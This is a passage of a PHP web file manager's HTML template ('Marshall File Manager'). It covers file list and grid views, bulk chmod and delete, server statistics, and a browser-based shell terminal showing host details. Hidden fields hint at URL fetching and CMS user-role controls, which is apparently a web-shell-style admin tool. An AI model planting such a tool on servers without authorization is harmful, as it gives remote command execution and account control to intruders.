            <button class="btn btn-sm btn-p"><svg viewBox="0 0 24 24"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>Save</button>
          </div>
        </div>
      </form>
    </div>

    <?php else:?>
    <!-- FILE VIEWS -->
    <!-- Filter bar -->
    <div class="filter-bar">
      <?php $filterIcons=[
        'all'=>'<rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/>',
        'images'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/>',
        'videos'=>'<rect x="2" y="5" width="14" height="14" rx="2"/><path d="M16 10l6-4v12l-6-4z"/>',
        'audio'=>'<path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/>',
        'code'=>'<polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>',
        'docs'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/>',
        'archives'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 3v18M14 8h2M14 12h2M14 16h2"/>',
        'text'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/>',
      ];
      $filters=['all'=>'All','images'=>'Images','videos'=>'Video','audio'=>'Audio','code'=>'Code','docs'=>'Docs','archives'=>'Archives','text'=>'Text'];
      foreach($filters as $fk=>$fl):?>
      <button class="fb-btn <?=$curTF===$fk||($curTF===''&&$fk==='all')?'active':''?>" onclick="location.href='?<?=http_build_query(array_merge($_GET,['tf'=>$fk==='all'?'':$fk]))?>'">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="width:13px;height:13px;flex-shrink:0"><?=$filterIcons[$fk]?></svg><?=$fl?><?php if($fk!=='all'): $cnt=0;foreach($list['files'] as $fi){$t=$fi['type'];$g=['images'=>'image','videos'=>'video','audio'=>'audio','code'=>'code','docs'=>['pdf','word','excel'],'archives'=>'archive','text'=>'text'];$want=isset($g[$fk])?$g[$fk]:'';if(is_array($want)){if(in_array($t,$want))$cnt++;}elseif($t===$want)$cnt++;} if($cnt>0) echo ' <span style="opacity:.6">('.$cnt.')</span>'; endif;?>
      </button>
      <?php endforeach;?>
    </div>

    <!-- LIST VIEW -->
    <div id="lvw">
    <div class="card">
      <div class="tw">
        <table class="ft" id="fileTable">
          <thead>
            <tr>
              <th class="cc"><input type="checkbox" class="rck" id="checkAll"></th>
              <th style="width:99%"><a href="<?=sortUrl('name')?>" class="<?=$curSort==='name'?'sa':''?>">Name<span class="arr"><?=$curSort==='name'?($curDir_==='asc'?'↑':'↓'):'↕'?></span></a></th>
              <th class="col-perms"><span>Perms</span></th>
              <th class="col-mtime"><a href="<?=sortUrl('mtime')?>" class="<?=$curSort==='mtime'?'sa':''?>">Modified<span class="arr"><?=$curSort==='mtime'?($curDir_==='asc'?'↑':'↓'):'↕'?></span></a></th>
              <th class="col-size"><a href="<?=sortUrl('size')?>" class="<?=$curSort==='size'?'sa':''?>">Size<span class="arr"><?=$curSort==='size'?($curDir_==='asc'?'↑':'↓'):'↕'?></span></a></th>
              <th style="text-align:right;padding-right:14px">Actions</th>
            </tr>
          </thead>
          <tbody>
          <?php $tags=$fm->getTagsFor($fm->getCwd());?>
          <?php foreach($list['folders'] as $f):
            $perms=substr(sprintf('%o',fileperms($fm->getCwd().'/'.$f['name'])),-4);
          ?>
          <tr data-name="<?=he($f['name'])?>" data-isdir="1" tabindex="0">
            <td class="cc"><input type="checkbox" class="rck item-ck" value="<?=he($f['name'])?>"></td>
            <td><div class="nc" onclick="location.href='?dir=<?=urlencode($fm->getCwd().'/'.$f['name'])?>'"
              data-ctx-name="<?=he($f['name'])?>" data-ctx-isdir="1" data-ctx-perm="<?=he($perms)?>">
               <div class="ib" style="background:rgba(133,137,140,.1)"><?=svgFolder()?></div>
              <div class="nm"><?php if(isset($tags[$f['name']])):?><span class="tag-dot" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:<?=he($tags[$f['name']]['color'])?>;flex-shrink:0" title="<?=he($tags[$f['name']]['label'])?>"></span><?php endif;?><span class="nt"><?=htmlspecialchars($f['name'])?></span><?php if(!empty($tags[$f['name']]['label'])):?><span class="eb" style="background:<?=he($tags[$f['name']]['color'])?>22;color:<?=he($tags[$f['name']]['color'])?>"><?=he($tags[$f['name']]['label'])?></span><?php endif;?><span class="eb">DIR</span></div>
            </div></td>
            <td class="col-perms col-perms-td"><span class="mono"><?=he($perms)?></span></td>
            <td class="col-mtime col-mtime-td"><span class="mt"><?=date('d/m/Y H:i',$f['mtime'])?></span></td>
            <td class="col-size"><button type="button" class="btn btn-xs btn-g dsz-btn" data-n="<?=he($f['name'])?>" title="Calculate folder size"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg><span class="bl">Size</span></button></td>
            <td><div class="acts">
              <?php if(!$fm->isRO()):?><button data-a="perm" data-n="<?=he($f['name'])?>" data-perm="<?=he($perms)?>" class="btn btn-xs btn-g" title="Permissions"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><span class="bl">Perm</span></button><?php endif;?>
              <button data-a="ren" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-amb"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg><span class="bl">Rename</span></button>
              <?php if(!$fm->isRO()):?><button data-a="del" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-red"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg><span class="bl">Delete</span></button><?php endif;?>
            </div></td>
          </tr>
          <?php endforeach;?>

          <?php foreach($list['files'] as $f):
            $type=$f['type'];$color=$fm->getColor($type);
            $ext=strtolower(pathinfo($f['name'],PATHINFO_EXTENSION));
            $perms=substr(sprintf('%o',fileperms($fm->getCwd().'/'.$f['name'])),-4);
            $prev=$fm->canPreview($type);$isTar=$fm->isTar($f['name']);
            $rawUrl='?raw='.urlencode($f['name']).'&dir='.urlencode($fm->getCwd());
          ?>
          <tr data-name="<?=he($f['name'])?>" data-isdir="0" data-type="<?=$type?>" tabindex="0">
            <td class="cc"><input type="checkbox" class="rck item-ck" value="<?=he($f['name'])?>"></td>
            <td><div class="nc" <?php if($prev):?>data-preview="<?=he($rawUrl)?>" data-type="<?=$type?>" data-fname="<?=he($f['name'])?>"<?php endif;?>
              data-ctx-name="<?=he($f['name'])?>" data-ctx-isdir="0" data-ctx-type="<?=$type?>" data-ctx-raw="<?=he($rawUrl)?>" data-ctx-perm="<?=he($perms)?>">
              <div class="ib" style="background:<?=$color?>18">
                <?php if($type==='image'):?><img src="<?=$rawUrl?>" style="width:34px;height:34px;border-radius:9px;object-fit:cover" loading="lazy" onerror="this.style.display='none';this.nextSibling&&(this.nextSibling.style.display='block')"><?php endif;?>
                <?=svgFile($type)?>
              </div>
              <div class="nm"><?php if(isset($tags[$f['name']])):?><span class="tag-dot" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:<?=he($tags[$f['name']]['color'])?>;flex-shrink:0" title="<?=he($tags[$f['name']]['label'])?>"></span><?php endif;?><span class="nt"><?=htmlspecialchars($f['name'])?></span><?php if(!empty($tags[$f['name']]['label'])):?><span class="eb" style="background:<?=he($tags[$f['name']]['color'])?>22;color:<?=he($tags[$f['name']]['color'])?>"><?=he($tags[$f['name']]['label'])?></span><?php endif;?><?php if($ext):?><span class="eb"><?=strtoupper($ext)?></span><?php endif;?></div>
            </div></td>
            <td class="col-perms col-perms-td"><span class="mono"><?=he($perms)?></span></td>
            <td class="col-mtime col-mtime-td"><span class="mt"><?=date('d/m/Y H:i',$f['mtime'])?></span></td>
            <td class="col-size"><span class="sz"><?=fmtSz($f['size'])?></span></td>
            <td><div class="acts">
              <a href="<?=$rawUrl?>&dl=1" class="btn btn-xs btn-g"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg><span class="bl">Download</span></a>
              <?php if(!$fm->isRO()):?><button data-a="share" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-g" title="Share Link"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg><span class="bl">Share</span></button><?php endif;?>
              <?php if($ext==='zip'):?><button data-a="unzip" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-blue"><svg viewBox="0 0 24 24"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span class="bl">Extract</span></button>
              <?php elseif($isTar):?><button data-a="tar-x" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-blue"><svg viewBox="0 0 24 24"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/></svg><span class="bl">Extract</span></button><?php endif;?>
              <a href="?edit=<?=urlencode($f['name'])?>&dir=<?=urlencode(isset($_GET['dir'])?$_GET['dir']:'')?>" class="btn btn-xs btn-blue"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg><span class="bl">Edit</span></a>
              <button data-a="hash" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-g" title="Checksum"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span class="bl">Hash</span></button>
              <?php if(!$fm->isRO()):?>
              <button data-a="perm" data-n="<?=he($f['name'])?>" data-perm="<?=he($perms)?>" class="btn btn-xs btn-g" title="Permissions"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><span class="bl">Perm</span></button>
              <button data-a="dup" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-g" title="Duplicate"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span class="bl">Dup</span></button>
              <button data-a="ren" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-amb"><svg viewBox="0 0 24 24"><polyline points="5 12 12 5 19 12"/><line x1="12" y1="5" x2="12" y2="19"/></svg><span class="bl">Rename</span></button>
              <button data-a="del" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-red"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg><span class="bl">Del</span></button>
              <?php endif;?>
            </div></td>
          </tr>
          <?php endforeach;?>
          <?php if(empty($list['folders'])&&empty($list['files'])):?>
          <tr><td colspan="6"><div class="empty"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><p><?=isset($_GET['q'])&&$_GET['q']!==''?'No matches.':'This folder is empty.'?></p></div></td></tr>
          <?php endif;?>
          </tbody>
        </table>
      </div>
    </div>
    </div><!-- #lvw -->

    <!-- GRID VIEW -->
    <div id="gvw" style="display:none">
      <div class="gv">
        <?php foreach(array_merge($list['folders'],$list['files']) as $item):
          $isDir=is_dir($fm->getCwd().'/'.$item['name']);
           $type=$isDir?'folder':$item['type'];$color=$isDir?'#85898C':$fm->getColor($type);
          $rawUrl='?raw='.urlencode($item['name']).'&dir='.urlencode($fm->getCwd());
          $prev=!$isDir&&$fm->canPreview($type);
        ?>
        <div class="gi" data-name="<?=he($item['name'])?>" data-isdir="<?=$isDir?1:0?>"
          <?php if(!$isDir&&$prev):?>data-preview="<?=he($rawUrl)?>" data-type="<?=$type?>" data-fname="<?=he($item['name'])?>"
          <?php elseif($isDir):?>onclick="location.href='?dir=<?=urlencode($fm->getCwd().'/'.$item['name'])?>'"<?php endif;?>
          data-ctx-name="<?=he($item['name'])?>" data-ctx-isdir="<?=$isDir?1:0?>" data-ctx-raw="<?=$isDir?'':he($rawUrl)?>">
          <input type="checkbox" class="rck item-ck gi-ck" value="<?=he($item['name'])?>" onclick="event.stopPropagation()">
          <div class="gi-ic" style="background:<?=$color?>18">
            <?php if(!$isDir&&$type==='image'):?><img src="<?=$rawUrl?>" class="gi-th" loading="lazy" onerror="this.style.display='none'"><?php elseif($isDir):?><?=svgFolder()?><?php else:?><?=svgFile($type)?><?php endif;?>
          </div>
          <div class="gi-n"><?=htmlspecialchars($item['name'])?></div>
          <div class="gi-m"><?=$isDir?'DIR':fmtSz($item['size'])?></div>
        </div>
        <?php endforeach;if(empty($list['folders'])&&empty($list['files'])):?><div class="empty" style="grid-column:1/-1"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><p>Empty.</p></div><?php endif;?>
      </div>
    </div>

    <!-- BULK BAR -->
    <div class="bulk-bar" id="bulkBar">
      <span class="bkc" id="bulkCount">0</span>
      <button type="button" class="btn btn-xs btn-g" id="bkZip"><svg viewBox="0 0 24 24"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/></svg>ZIP</button>
      <button type="button" class="btn btn-xs btn-g" id="bkTar"><svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>TAR.GZ</button>
      <button type="button" class="btn btn-xs btn-blue" id="bkCopy"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy</button>
      <button type="button" class="btn btn-xs btn-amb" id="bkMove"><svg viewBox="0 0 24 24"><polyline points="16 3 21 3 21 8"/><line x1="21" y1="3" x2="14" y2="10"/><path d="M21 14v5a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5"/></svg>Move</button>
      <button type="button" class="btn btn-xs btn-g" id="bkChmod"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Chmod</button>
      <button type="button" class="btn btn-xs btn-red" id="bkDel"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>Delete</button>
    </div>
    <?php endif;?>
  </div><!-- .content -->
</main>

<!-- STATUS BAR -->
<?php $ss=$fm->sysStats();?>
<footer class="bar">
  <div class="bs"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><strong><?=$totalFolders?></strong>&nbsp;folders</div>
  <div class="bs"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg><strong><?=$totalFiles?></strong>&nbsp;files</div>
  <?php if($totalSize>0):?><div class="bs"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg><strong><?=fmtSz($totalSize)?></strong></div><?php endif;?>
  <div class="bs bs-click" id="sbDisk" title="Disk usage - click for server details"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg><strong id="sbDiskV"><?=$ss['disk_pct']?>%</strong>&nbsp;disk</div>
  <?php if($ss['load']):?>
  <div class="bs bs-click" id="sbLoad" title="CPU load average (1m / 5m / 15m) - click for server details"><svg viewBox="0 0 24 24"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/></svg><strong id="sbLoadV"><?=implode(' ',$ss['load'])?></strong></div>
  <?php endif;?>
  <?php if($ss['mem_total']>0):?>
  <div class="bs bs-click" id="sbMem" title="RAM usage - click for server details"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="15" x2="23" y2="15"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="15" x2="4" y2="15"/></svg><strong id="sbMemV"><?=$ss['mem_pct']?>%</strong>&nbsp;ram</div>
  <?php endif;?>
  <?php if($ss['uptime']>0):?>
  <div class="bs bs-click" title="Server uptime - click for server details"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><strong id="sbUptimeV"><?=fmtUptime($ss['uptime'])?></strong></div>
  <?php endif;?>
  <div class="br">
    <div class="bs" id="selStat" style="display:none"><svg viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg><strong id="selCount">0</strong>&nbsp;selected</div>
    <div class="bs bs-click" title="Server info"><svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>PHP&nbsp;<strong><?=PHP_VERSION?></strong></div>
    <div class="bs"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><strong id="clockEl"><?=date('H:i:s')?></strong></div>
  </div>
</footer>
</div><!-- .shell -->

<!-- HIDDEN FORM -->
<form id="af" method="post" style="display:none">
  <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
  <input type="hidden" name="action" id="af_a"><input type="hidden" name="item_name" id="af_n">
  <input type="hidden" name="old_name" id="af_o"><input type="hidden" name="new_name" id="af_nw">
  <input type="hidden" name="items" id="af_items"><input type="hidden" name="target" id="af_tgt">
  <input type="hidden" name="trash_id" id="af_tr"><input type="hidden" name="perm" id="af_perm">
  <input type="hidden" name="color" id="af_color"><input type="hidden" name="label" id="af_label">
  <input type="hidden" name="config_path" id="af_cfg"><input type="hidden" name="cms_id" id="af_cid">
  <input type="hidden" name="cms_role" id="af_crole"><input type="hidden" name="url" id="af_url">
  <input type="hidden" name="fname" id="af_fname">
</form>

<!-- CONTEXT MENU (desktop) -->
<div class="ctx" id="ctx">
  <div class="ctx-header"><svg viewBox="0 0 24 24" fill="none" stroke="var(--t3)" stroke-width="1.8" stroke-linecap="round" style="width:14px;height:14px;flex-shrink:0"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg><span id="ctx-name"></span></div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" id="ctx-open"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>Open</div>
  <div class="ctx-item" id="ctx-edit"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>Edit</div>
  <div class="ctx-item" id="ctx-dl"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</div>
  <div class="ctx-item" id="ctx-prev"><svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>Preview</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" id="ctx-path"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy Path</div>
  <div class="ctx-item" id="ctx-hash"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Checksum</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" id="ctx-dup"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Duplicate</div>
  <div class="ctx-item" id="ctx-share"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>Share Link</div>
  <div class="ctx-item" id="ctx-dirsize"><svg viewBox="0 0 24 24"><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>Calculate Size</div>
  <div class="ctx-item" id="ctx-perm"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Permissions</div>
  <?php if(!empty($_SESSION['fm_admin'])):?><div class="ctx-item" id="ctx-owner"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="4"/><path d="M2 21v-1a7 7 0 0 1 14 0v1"/><path d="M17 11h5M19 9v4"/></svg>Owner &amp; Group</div><?php endif;?>
  <div class="ctx-item" id="ctx-ren"><svg viewBox="0 0 24 24"><polyline points="5 12 12 5 19 12"/><line x1="12" y1="5" x2="12" y2="19"/></svg>Rename</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item danger" id="ctx-del"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>Delete</div>
</div>

<!-- MOBILE BOTTOM SHEET -->
<div class="sheet-ov" id="shOv"></div>
<div class="sheet" id="sheet">
  <div class="sheet-handle"></div>
  <div class="sheet-info">
    <div class="sheet-name" id="sh-name"></div>
    <div class="sheet-meta" id="sh-meta"></div>
  </div>
  <div class="sheet-grid" id="sh-grid"></div>
  <div style="height:8px"></div>
</div>

<!-- PREVIEW MODAL -->
<div class="prev-ov" id="prevOv">
  <div class="prev-box">
    <div class="prev-head">
      <span id="prevName"></span>
      <button type="button" id="prevMdToggle" class="btn btn-xs btn-g" style="margin-left:auto;margin-right:6px;display:none"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg><span id="prevMdToggleLabel">View Source</span></button>
      <a id="prevDl" class="btn btn-xs btn-g" href="#" download style="margin-right:6px"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</a>
      <button type="button" class="btn btn-icon btn-g" id="prevClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="prev-body" id="prevBody"></div>
  </div>
</div>

<!-- TERMINAL MODAL -->
<?php if(!$fm->isRO()):?>
<div class="mod-ov term-ov" id="termOv">
  <div class="term-win" id="termWin">
    <div class="term-out" id="termOut"><span class="term-line info-line">Powered by Marshall File Manager [2019]</span><span class="term-line info-line">All rights reserved 2019 - 2026 LiquidState</span><span class="term-line"><span class="term-at">Server IP:</span> <span class="term-path"><?=htmlspecialchars($_SERVER['SERVER_ADDR']??'Unknown')?></span></span><span class="term-line"><span class="term-at">Connection status:</span> <span class="term-prompt-str">GOOD</span></span><span class="term-line"><span class="term-at">Working dir:</span> <?=htmlspecialchars($fm->getCwd())?></span></div>
    <div class="term-prompt-wrap"><div class="term-row"><span class="term-ps"><span class="term-prompt-str"><?=htmlspecialchars($_SESSION['fm_user']??'user')?></span><span class="term-at">@</span><span class="term-path"><?=htmlspecialchars(gethostname()?:'server')?></span><span class="term-dollar">:<?=htmlspecialchars($fm->getTerminalPromptPath())?>$ </span></span><input class="term-inp" id="termInp" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"><span class="term-cursor" aria-hidden="true"></span></div>
      <div class="term-suggest" id="termSug" style="display:none;bottom:100%;left:2px"></div>
    </div>
    <div class="term-footer">
          <div class="term-footer-item"><span class="term-footer-label">[DN]</span><span class="term-footer-value" id="termHost"><?=htmlspecialchars($_SERVER['HTTP_HOST']??'localhost')?></span></div>
          <div class="term-footer-sep"></div>
          <div class="term-footer-item"><span class="term-footer-value" id="termIp">IP: <?=htmlspecialchars($_SERVER['SERVER_ADDR']??'—')?></span></div>
          <div class="term-footer-sep"></div>
          <div class="term-footer-item"><span class="term-footer-label">[CPU]</span><span class="term-footer-value" id="termCpu">0%</span><span class="term-footer-graph"><canvas id="termCpuGraph" width="50" height="12"></canvas></span></div>
          <div class="term-footer-sep"></div>
          <div class="term-footer-item"><span class="term-footer-label">[RAM]</span><span class="term-footer-value" id="termRam">0 B / 0 B</span></div>
          <div class="term-footer-sep term-footer-hide-sm"></div>
          <div class="term-footer-item term-footer-hide-sm"><span class="term-footer-label">[DSK]</span><span class="term-footer-value" id="termDisk">0 B / 0 B</span></div>
          <div class="term-footer-sep term-footer-hide-sm"></div>
          <div class="term-footer-item term-footer-hide-sm"><span class="term-footer-label">[UPT]</span><span class="term-footer-value" id="termUptime">0s</span></div>
          <div class="term-footer-sep term-footer-hide-sm"></div>
          <div class="term-footer-item term-footer-hide-sm"><span class="term-footer-label">[PRC]</span><span class="term-footer-value" id="termProc">0</span></div>
          <div class="term-footer-sep term-footer-hide-md"></div>
          <div class="term-footer-item term-footer-hide-md"><span class="term-footer-label">[TIME]</span><span class="term-footer-value" id="termTime">00:00:00</span></div>
          <div class="term-footer-sep term-footer-hide-md"></div>
          <div class="term-footer-item term-footer-hide-md"><span class="term-footer-label">[USR]</span><span class="term-footer-value" id="termUser"><?=htmlspecialchars($_SESSION['fm_user']??'user')?></span></div>
          <div class="term-footer-sep term-footer-hide-lg"></div>
          <div class="term-footer-item term-footer-hide-lg"><span class="term-footer-label">[HOS]</span><span class="term-footer-value" id="termHostname"><?=htmlspecialchars(gethostname()?:'server')?></span></div>
          <div class="term-footer-sep term-footer-hide-lg"></div>
          <div class="term-footer-item term-footer-hide-lg"><span class="term-footer-label">[VER]</span><span class="term-footer-value">1.0.0</span></div>
          <div class="term-footer-spacer"></div>
    </div>
  </div>
</div>
<?php endif;?>

<!-- CHECKSUM MODAL -->
<div class="mod-ov" id="hashOv">
  <div class="mod mod-md">
